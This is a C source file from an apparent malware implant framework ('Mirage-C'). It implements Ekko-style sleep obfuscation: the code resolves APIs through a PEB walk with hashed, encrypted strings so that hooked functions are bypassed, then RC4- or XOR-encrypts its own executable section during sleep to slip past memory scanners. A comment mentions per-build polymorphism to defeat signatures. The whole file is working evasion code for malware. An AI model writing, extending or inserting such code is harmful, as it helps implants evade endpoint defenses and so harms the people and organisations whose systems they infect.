/*
 * sleep_obfusc.c — Ekko-style sleep obfuscation for Mirage-C
 *
 * Encrypts .text section (excluding current page) with RC4 via
 * SystemFunction032 during sleep, then decrypts on wake.
 *
 * Steps:
 *   1. PEB-walk advapi32.dll → resolve SystemFunction032
 *   2. Find .text bounds via own PE headers (GS:[0x60]→PEB)
 *   3. Compute page boundaries, exclude current page
 *   4. NtProtectVirtualMemory(RW) → SystemFunction032(RC4 encrypt)
 *   5. NtDelayExecution(ms) — syscall, in ntdll.dll
 *   6. SystemFunction032(RC4 decrypt) → NtProtectVirtualMemory(restore)
 *   7. NtFlushInstructionCache(.text)
 *
 * Fallback: XOR if SystemFunction032 unavailable (via NtDelayExecution).
 * CRT-free — uses mirage_Nt* wrappers and PEB-walk API resolution.
 */

#include "sleep_obfusc.h"
#include "config.h"
#include "engine.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include "nt_types.h"

/* ── PE constants ──────────────────────────────────────────── */
#ifndef IMAGE_SCN_MEM_EXECUTE
#define IMAGE_SCN_MEM_EXECUTE  0x20000000
#endif

#ifndef PAGE_READWRITE
#define PAGE_READWRITE         0x04
#endif

#ifndef PAGE_SIZE
#define PAGE_SIZE              0x1000
#endif

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)

/* ── USTRING for SystemFunction032 ─────────────────────────── */
typedef struct _USTRING {
    DWORD           Length;
    DWORD           MaximumLength;
    unsigned char  *Buffer;
} USTRING;

/* ── SystemFunction032 signature ───────────────────────────── */
typedef NTSTATUS (NTAPI *pSystemFunction032)(USTRING *data, USTRING *key);

/* ── Static state ──────────────────────────────────────────── */
static struct {
    void             *text_va;
    SIZE_T            text_size;
    ULONG             old_protect;
    pSystemFunction032 pSysFunc032;
    int               use_xor_fallback;   /* 1 if RC4 unavailable */
    int               ready;
} g_ekko;

/*
 * get_own_image_base — Return own ImageBaseAddress via PEB.
 * GS:[0x60] → PEB → 0x10 → ImageBaseAddress. Avoids calling
 * GetModuleHandleA(NULL) which may be hooked.
 */
static void *get_own_image_base(void) {
    void *peb;
#if defined(_M_X64) || defined(__x86_64__)
    peb = (void *)__readgsqword(0x60);
    return *(void **)((char *)peb + 0x10);
#else
    peb = (void *)__readfsdword(0x30);
    return *(void **)((char *)peb + 0x08);
#endif
}

/*
 * find_text_section — Walk own PE headers to locate .text bounds.
 * Returns 1 on success. Stores VA in *out_va, size in *out_size.
 */
static int find_text_section(void *base, uint8_t **out_va, SIZE_T *out_size) {
    uint8_t *bp = (uint8_t *)base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)bp;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(bp + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    uint16_t ns = nt->FileHeader.NumberOfSections;

    for (uint16_t i = 0; i < ns; i++) {
        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            sec[i].Misc.VirtualSize > 0) {
            *out_va   = bp + sec[i].VirtualAddress;
            *out_size = sec[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/*
 * resolve_sysfunc032 — PEB-walk advapi32.dll → SystemFunction032.
 */
static pSystemFunction032 resolve_sysfunc032(void) {
    /* Resolve advapi32.dll by hash */
    char dll[32];
    enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, dll);
    void *adv = mirage_get_module_by_hash(
        mirage_encrypted_hash_module(dll));
    if (!adv) return NULL;

    /* Resolve SystemFunction032 by hash */
    char fn[32];
    enc_decrypt(enc_SystemFunction032, ENC_SYSTEMFUNCTION032_LEN, fn);
    return (pSystemFunction032)mirage_get_function_by_hash(
        adv, mirage_encrypted_hash_func(fn));
}

/*
 * xor_encrypt_region — Simple XOR encrypt/decrypt .text region
 * in-place with a repeating 16-byte key. Used as fallback when
 * SystemFunction032 (RC4) is unavailable.
 *
 * Calling twice with the same key decrypts.
 */
static void xor_encrypt_region(uint8_t *va, SIZE_T size, const uint8_t *key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < size; i++)
        va[i] ^= key[i % key_len];
}

/*
 * ekko_init — One-time init: find .text, resolve SystemFunction032.
 * Returns 1 on success, 0 if critical failure.
 */
static int ekko_init(void) {
    if (g_ekko.ready) return 1;

    /* 1. Find own .text section */
    void *base = get_own_image_base();
    if (!base) return 0;

    uint8_t *text_va = NULL;
    SIZE_T   text_sz = 0;
    if (!find_text_section(base, &text_va, &text_sz))
        return 0;

    if (text_sz == 0) return 0;

    g_ekko.text_va   = text_va;
    g_ekko.text_size = text_sz;

    /* 2. Resolve SystemFunction032 (RC4); fall back to XOR */
    g_ekko.pSysFunc032 = resolve_sysfunc032();
    g_ekko.use_xor_fallback = (g_ekko.pSysFunc032 == NULL);

    g_ekko.ready = 1;
    return 1;
}

/*
 * ekko_sleep — Obfuscated sleep.
 *
 * Encrypts all .text pages EXCEPT the one containing the caller
 * (ekko_sleep itself), calls NtDelayExecution, then decrypts.
 *
 * On failure, falls through to NtDelayExecution without encryption.
 */
int ekko_sleep(DWORD milliseconds) {
    if (!ekko_init()) {
        /* Fallback: plain sleep */
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)((LONGLONG)milliseconds * 10000LL);
        mirage_NtDelayExecution(FALSE, &delay);
        return 0;
    }

    /* ── Determine which page contains this function ───── */
    uint8_t *my_addr = (uint8_t *)&ekko_sleep;
    uintptr_t caller_page = (uintptr_t)my_addr & ~((uintptr_t)PAGE_SIZE - 1);
    uintptr_t text_start   = (uintptr_t)g_ekko.text_va;
    uintptr_t text_end     = text_start + g_ekko.text_size;

    /* ── Generate 16-byte RC4/XOR key ──────────────────── */
    /* ponytail: static key derived from stack canary + image base;
     * randomize per-build via poly.go if signature matters. */
    uint8_t key[16];
    uintptr_t base_addr = (uintptr_t)get_own_image_base();
    for (int i = 0; i < 8; i++) {
        key[i]     = (uint8_t)(base_addr >> (i * 8));
        key[i + 8] = (uint8_t)(caller_page >> (i * 8));
    }

    /* ── Save current protection ────────────────────────── */
    SIZE_T region_size;
    PVOID  region_addr;
    ULONG  old_prot;

    /* ── Encrypt each page except caller's ──────────────── */
    for (uintptr_t page = text_start; page < text_end; page += PAGE_SIZE) {
        if (page == caller_page) continue;

        SIZE_T chunk = PAGE_SIZE;
        if (page + PAGE_SIZE > text_end)
            chunk = text_end - page;

        region_addr = (PVOID)page;
        region_size = chunk;
        if (!NT_SUCCESS(mirage_NtProtectVirtualMemory(
                (HANDLE)(intptr_t)(-1),
                &region_addr, &region_size,
                PAGE_READWRITE, &old_prot)))
            continue;

        if (g_ekko.use_xor_fallback) {
            xor_encrypt_region((uint8_t *)page, chunk, key, 16);
        } else {
            USTRING data, k;
            data.Buffer        = (unsigned char *)page;
            data.Length        = (DWORD)chunk;
            data.MaximumLength = (DWORD)chunk;
            k.Buffer           = key;
            k.Length           = 16;
            k.MaximumLength    = 16;
            g_ekko.pSysFunc032(&data, &k);
        }
    }

    /* ── Sleep via NtDelayExecution (syscall, safe) ─────── */
    {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)((LONGLONG)milliseconds * 10000LL);
        mirage_NtDelayExecution(FALSE, &delay);
    }

    /* ── Decrypt each page except caller's ──────────────── */
    for (uintptr_t page = text_start; page < text_end; page += PAGE_SIZE) {
        if (page == caller_page) continue;

        SIZE_T chunk = PAGE_SIZE;
        if (page + PAGE_SIZE > text_end)
            chunk = text_end - page;

        if (g_ekko.use_xor_fallback) {
            xor_encrypt_region((uint8_t *)page, chunk, key, 16);
        } else {
            USTRING data, k;
            data.Buffer        = (unsigned char *)page;
            data.Length        = (DWORD)chunk;
            data.MaximumLength = (DWORD)chunk;
            k.Buffer           = key;
            k.Length           = 16;
            k.MaximumLength    = 16;
            g_ekko.pSysFunc032(&data, &k);
        }
    }

    /* ── Restore protection and flush ICache ────────────── */
    for (uintptr_t page = text_start; page < text_end; page += PAGE_SIZE) {
        if (page == caller_page) continue;

        SIZE_T chunk = PAGE_SIZE;
        if (page + PAGE_SIZE > text_end)
            chunk = text_end - page;

        region_addr = (PVOID)page;
        region_size = chunk;
        ULONG dummy;
        mirage_NtProtectVirtualMemory(
            (HANDLE)(intptr_t)(-1),
            &region_addr, &region_size,
            old_prot, &dummy);
    }

    mirage_NtFlushInstructionCache(
        (HANDLE)(intptr_t)(-1),
        g_ekko.text_va, g_ekko.text_size);

    return 1;
}
